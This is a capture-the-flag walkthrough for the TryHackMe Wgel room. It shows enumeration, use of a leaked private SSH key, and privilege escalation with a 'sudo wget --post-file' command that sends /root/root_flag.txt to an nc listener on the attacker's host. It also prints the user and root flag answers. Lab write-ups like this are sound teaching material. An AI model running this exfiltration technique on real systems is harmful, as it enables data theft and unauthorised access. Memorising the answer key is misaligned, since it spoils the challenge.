# TryHackMe Wgel CTF
**Can you exfiltrate the root flag?**

## Task-1 Wgel CTF

* Starting with enumeration, I performed nmap scan and gobuster on this. Nmap showed only two ports - '22' and '80'. Port '22' is for ssh means we have to find username and password to login. So I opened the ip in website which was a static apache webpage. But it was something different. Configuration layout was not complete. So I view the page source amd got this line - '<!-- Jessie don't forget to udate the webiste -->'. So we have a user named 'jessie'. 

* For gobuster scan I used /dirb/common.txt/ worrdlist which gave a '/sitemap/'' directory which on further enumeration gave a file named '.ssh'. So i opened it and it gave me a private key which we can use to login into ssh. So type '*wget http://<IP>/sitemap/.ssh/id_rsa*' in your terminal. So the file will be downloaded and now type 'ssh -i id_rsa jessie@<IP>' and you will have access to jessie's shell.

* Now search for user flag using 'find -name '*user*'' and you will see 'user_flag.txt' in Documents folder. Now cat the flag using '*cat ./Documents/user_flag.txt*' which is the answer to our 1 question.

1. User flag<br>
Answer : 057c67131c3d5e42dd5cd3075b198ff6

* Now type 'sudo -l' for user privileges. We see that user can run '/usr/bin/wget'. So I searched for this on google and got something on https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/ . So first copy this payload 'sudo /usr/bin/wget --post-file=/root/root_flag.txt <IP>:8888'. We have to search for 'root_flag' because this is the format which we got from 'user_flag.txt'. So open your nc connection in your local terminal using command 'nc -lnvp 8888' and fire the above command in 'jessie' terminal. You will see the flag in your local terminal. 

2. Root flag<br>
Answer : b1b968b37519ad1daa6408188649263d*